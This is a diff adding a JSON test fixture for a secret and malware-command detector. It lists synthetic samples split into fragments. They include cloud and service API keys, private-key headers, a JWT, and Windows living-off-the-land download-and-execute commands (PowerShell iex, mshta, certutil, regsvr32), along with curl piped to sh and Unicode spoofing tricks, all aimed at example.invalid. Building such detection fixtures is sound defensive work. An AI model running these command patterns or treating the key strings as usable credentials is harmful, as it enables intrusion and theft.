@@ -1,0 +1,387 @@
+[
+  {
+    "detectorId": "aws_access_key",
+    "textParts": [
+      "AKIAAB",
+      "CDEFGH",
+      "IJKLMN",
+      "OP"
+    ]
+  },
+  {
+    "detectorId": "google_api_key",
+    "textParts": [
+      "AIzaHV",
+      "47tmJA",
+      "OkIwbc",
+      "ZdO5lH",
+      "VI8LFu",
+      "gUZ44c",
+      "iaG"
+    ]
+  },
+  {
+    "detectorId": "sendgrid_api_key",
+    "textParts": [
+      "SG.Cp5",
+      "DJrUj8",
+      "dPMicg",
+      "ZFO1kr",
+      "Z.xSa1",
+      "guuIUD",
+      "jbSeUw",
+      "YsD2hc",
+      "VQNshU",
+      "zoZOoJ",
+      "OE9BRI",
+      "WF5"
+    ]
+  },
+  {
+    "detectorId": "mailgun_api_key",
+    "textParts": [
+      "key-96",
+      "5a4150",
+      "665f69",
+      "dde871",
+      "f8db9e",
+      "1d0bd5"
+    ]
+  },
+  {
+    "detectorId": "twilio_account_sid",
+    "textParts": [
+      "ACf78d",
+      "37a761",
+      "0a83f8",
+      "b90a09",
+      "958d48",
+      "739d"
+    ]
+  },
+  {
+    "detectorId": "database_url_with_credentials",
+    "textParts": [
+      "postgr",
+      "es://f",
+      "ixture",
+      ":synth",
+      "etic@e",
+      "xample",
+      ".inval",
+      "id/db"
+    ]
+  },
+  {
+    "detectorId": "open_ai_project_key",
+    "textParts": [
+      "sk-pro",
+      "j-PAGp",
+      "0ECPRP",
+      "tBgRBR",
+      "J86d0W",
+      "WHqewF",
+      "6Ov6Fj",
+      "7dxs2j",
+      "OS97"
+    ]
+  },
+  {
+    "detectorId": "open_ai_api_key",
+    "textParts": [
+      "sk-kXG",
+      "6XvWjg",
+      "UK9ZAb",
+      "izB4WG",
+      "HSwOEM",
+      "6huWle",
+      "rYvbOj",
+      "5LCgV7",
+      "OCj"
+    ]
+  },
+  {
+    "detectorId": "anthropic_api_key",
+    "textParts": [
+      "sk-ant",
+      "-fjbbM",
+      "32B5MI",
+      "zdoTjZ",
+      "GYhO8I",
+      "xK422i",
+      "M4VnOx",
+      "PP8Ae"
+    ]
+  },
+  {
+    "detectorId": "git_hub_classic_token",
+    "textParts": [
+      "ghp_Ap",
+      "I4ziFr",
+      "y1RvrB",
+      "vYPc5i",
+      "m85oG6",
+      "2aR5YU",
+      "AihU"
+    ]
+  },
+  {
+    "detectorId": "git_hub_fine_grained_token",
+    "textParts": [
+      "github",
+      "_pat_O",
+      "MOulJV",
+      "gPKLnW",
+      "fAWwXp",
+      "iuUP6i",
+      "h4Udf"
+    ]
+  },
+  {
+    "detectorId": "npm_token",
+    "textParts": [
+      "npm_H5",
+      "d1Wu7z",
+      "ntbaqI",
+      "HMUWmX",
+      "FjdXG9",
+      "tpvmoj",
+      "onmI"
+    ]
+  },
+  {
+    "detectorId": "stripe_live_secret",
+    "textParts": [
+      "sk_liv",
+      "e_J2F0",
+      "t5V05K",
+      "l1F6zW",
+      "esbPf8",
+      "sRVR"
+    ]
+  },
+  {
+    "detectorId": "stripe_live_publishable",
+    "textParts": [
+      "pk_liv",
+      "e_QpAe",
+      "L4ap0i",
+      "WZwXO6",
+      "vDqrz3",
+      "GH2v"
+    ]
+  },
+  {
+    "detectorId": "slack_token",
+    "textParts": [
+      "xoxb-y",
+      "A8zP6K",
+      "364YRS",
+      "hR1dcR",
+      "a"
+    ]
+  },
+  {
+    "detectorId": "discord_bot_token",
+    "textParts": [
+      "9t73ej",
+      "5UqOfx",
+      "7s0leO",
+      "G57Uol",
+      ".XrYqa",
+      "L.9u9X",
+      "bC4JAx",
+      "7pC8Xk",
+      "skdl9G",
+      "URTEJO",
+      "sa"
+    ]
+  },
+  {
+    "detectorId": "private_key_pem",
+    "textParts": [
+      "-----B",
+      "EGIN R",
+      "SA PRI",
+      "VATE K",
+      "EY----",
+      "-"
+    ]
+  },
+  {
+    "detectorId": "ssh_private_key_header",
+    "textParts": [
+      "-----B",
+      "EGIN O",
+      "PENSSH",
+      " PRIVA",
+      "TE KEY",
+      "-----"
+    ]
+  },
+  {
+    "detectorId": "jwt",
+    "textParts": [
+      "eyJToX",
+      "L85Rm8",
+      "FIZqPo",
+      "lyFUR.",
+      "9MFrPH",
+      "KbWmVK",
+      "N2WLe8",
+      "bE.Osx",
+      "Oc1b1E",
+      "UCmTkE",
+      "DCgnt5",
+      "K3Eaju",
+      "Oox"
+    ]
+  },
+  {
+    "detectorId": "bitcoin_wif_private_key",
+    "textParts": [
+      "K12345",
+      "6789AB",
+      "CDEFGH",
+      "JKLMNP",
+      "QRSTUV",
+      "WXYZab",
+      "cdefgh",
+      "ijkmno",
+      "pqrs"
+    ]
+  },
+  {
+    "detectorId": "powershell_encoded_payload",
+    "textParts": [
+      "powers",
+      "hell -",
+      "encode",
+      "dcomma",
+      "nd SYN",
+      "THETIC"
+    ]
+  },
+  {
+    "detectorId": "hidden_powershell_window",
+    "textParts": [
+      "powers",
+      "hell -",
+      "window",
+      "style ",
+      "hidden"
+    ]
+  },
+  {
+    "detectorId": "powershell_execution_policy_bypass",
+    "textParts": [
+      "powers",
+      "hell -",
+      "execut",
+      "ionpol",
+      "icy by",
+      "pass"
+    ]
+  },
+  {
+    "detectorId": "powershell_remote_download_execute",
+    "textParts": [
+      "iex (i",
+      "rm htt",
+      "ps://e",
+      "xample",
+      ".inval",
+      "id/fak",
+      "e.ps1)"
+    ]
+  },
+  {
+    "detectorId": "mshta_web_payload",
+    "textParts": [
+      "mshta ",
+      "https:",
+      "//exam",
+      "ple.in",
+      "valid/",
+      "fixtur",
+      "e"
+    ]
+  },
+  {
+    "detectorId": "certutil_web_download",
+    "textParts": [
+      "certut",
+      "il -ur",
+      "lcache",
+      " https",
+      "://exa",
+      "mple.i",
+      "nvalid",
+      "/fixtu",
+      "re"
+    ]
+  },
+  {
+    "detectorId": "regsvr32_web_payload",
+    "textParts": [
+      "regsvr",
+      "32 /s ",
+      "/i:htt",
+      "ps://e",
+      "xample",
+      ".inval",
+      "id/fix",
+      "ture s",
+      "crobj.",
+      "dll"
+    ]
+  },
+  {
+    "detectorId": "bitsadmin_web_transfer",
+    "textParts": [
+      "bitsad",
+      "min /t",
+      "ransfe",
+      "r fixt",
+      "ure"
+    ]
+  },
+  {
+    "detectorId": "curl_wget_pipe_to_shell",
+    "textParts": [
+      "curl h",
+      "ttps:/",
+      "/examp",
+      "le.inv",
+      "alid/f",
+      "ixture",
+      " | sh"
+    ]
+  },
+  {
+    "detectorId": "unicode_bidi_override",
+    "textParts": [
+      "report",
+      "‮gpj.e",
+      "xe"
+    ]
+  },
+  {
+    "detectorId": "unicode_zero_width_in_code",
+    "textParts": [
+      "api​Ke",
+      "y"
+    ]
+  },
+  {
+    "detectorId": "unicode_confusable_url_host",
+    "textParts": [
+      "https:",
+      "//pаyp",
+      "al.exa",
+      "mple.i",
+      "nvalid",
+      "/login"
+    ]
+  }
+]
